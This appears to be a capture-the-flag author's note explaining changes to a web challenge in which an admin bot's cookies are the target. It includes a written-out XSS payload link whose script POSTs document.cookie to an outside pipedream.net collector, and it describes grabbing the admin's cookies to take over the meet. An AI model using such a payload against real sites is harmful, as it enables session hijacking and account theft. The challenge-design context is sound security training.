About this chall and what are the modification I've done:

1. I made the meet code as random so everyone will get different meet code to join. But many peoples will access this challenge at same time. so 90% time you cant go inside meet since the meet code is random everytime.
2. First I implemented xss in this challenge so you guys can craft a xss payload to steal the Exploit everything's cookies. But I had an issue with request html module and selenium the javascript doesn't get's executed when we send that crafted payload.
Ex: if we send <script>alert("xss")</script> it'll work and we can able to trigger the xss
but If we craft a payload in link like, 
https://url/sendmsg?message=<script>fetch('https://enhwpmggaetek.m.pipedream.net',{method: 'POST',mode: 'no-cors',body:document.cookie});</script>

now admin will open it but the javascript won't get execute since I had issues with those modules.. 
So I had an alternative plan for this. Making a separate admin bot for this.. but if I give you two links one has the chall and another has the admin bot, you guys can easily guess and solve this real quick.
So I removed that xss :(
Then I made this chall like if you send a link in chat box.. then admin will send his cookies for that link. so you can grab it and change it in meet.
I hope you'll understand this :)